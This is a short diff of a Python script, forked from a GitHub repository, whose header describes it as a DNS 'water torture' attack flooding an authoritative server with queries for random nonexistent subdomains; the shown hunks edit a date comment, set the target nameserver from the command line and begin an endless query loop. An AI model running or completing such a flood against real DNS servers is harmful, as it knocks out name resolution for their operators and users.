@@ -5,7 +5,7 @@
 #Purpose : Ataque DNS autoritativo con peticion de subdominios aleatorios inexistentes
 #From: https://github.com/hackingyseguridad/watertorture/blob/master/subdominio.py 
 #-- Forked by Christopher Gray
-# date: 4/19/18
+# Date: 4/19/18 - Version 0.0.1
 
 import dns.resolver
 import random
@@ -27,7 +27,7 @@ elif len(sys.argv) == 2:
 # 8.8.8.8 is Google's public DNS server
 #my_resolver.nameservers = ['8.8.8.8']
 
-my_resolver.nameservers = [sys.argv[1]]
+dns.resolver.nameservers = [sys.argv[1]]
 
 while 1:
 	subdominio = str(random.randrange(10000000))
